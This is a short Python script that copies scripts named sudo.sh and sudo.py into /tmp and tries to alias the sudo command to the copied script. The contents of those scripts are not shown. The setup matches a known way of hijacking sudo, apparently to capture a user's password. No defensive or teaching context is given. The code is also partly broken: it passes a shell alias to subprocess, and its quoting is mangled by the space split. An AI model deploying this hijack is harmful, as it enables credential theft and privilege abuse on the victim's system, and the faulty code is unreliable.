import subprocess

# Download .sh files code
#
#
# --------------------------
all_commands = ["pwd","chmod +x sudo.sh","cp sudo.sh /tmp/sudo.sh","chmod +x sudo.py","cp sudo.py /tmp/sudo.py","alias sudo='/tmp/sudo.sh'"]

for i in all_commands:
    print(i)
    subprocess.run(i.split(" "))

